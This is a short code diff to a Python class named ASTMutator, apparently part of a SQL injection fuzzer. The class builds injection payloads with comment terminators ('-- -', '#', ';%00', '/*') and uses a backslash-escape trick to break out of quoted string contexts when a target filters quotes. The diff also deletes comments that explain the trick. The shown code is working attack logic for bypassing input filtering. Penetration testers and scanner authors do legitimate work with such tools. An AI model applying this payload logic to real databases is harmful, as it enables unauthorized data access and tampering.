@@ -190,16 +190,11 @@ class ASTMutator:
         terminators = ["-- -", "#", ";%00", "/*"]
         chosen_term = random.choice(terminators) if random.random() < 0.8 else ""
 
-        if self.quoteless:
+        if self.quoteless or self.disable_strings:
             # The target specifically filters/escapes quotes (e.g. ' -> / or \). 
             # We absolutely avoid sending ANY quotes.
-            # Instead, we try to use slashes to escape the applications own closing quote and inject our logic.
-            # E.g., if app does: SELECT * FROM users WHERE user = ' [input] '
-            # Sending \ (Backslash) might become: SELECT * FROM users WHERE user = '\' AND ... '
-            # Which escapes the quote and shifts the syntax.
             if self.context in ["SINGLE_QUOTE", "DOUBLE_QUOTE", "GENERIC"]:
                  # Relying on backslash escape trick to break out of string context implicitly
-                 # Application quote will be escaped: `WHERE id = '\' AND 1=1 #`
                  escape_char = "\\" 
                  return escape_char + payload + chosen_term
             return payload + chosen_term
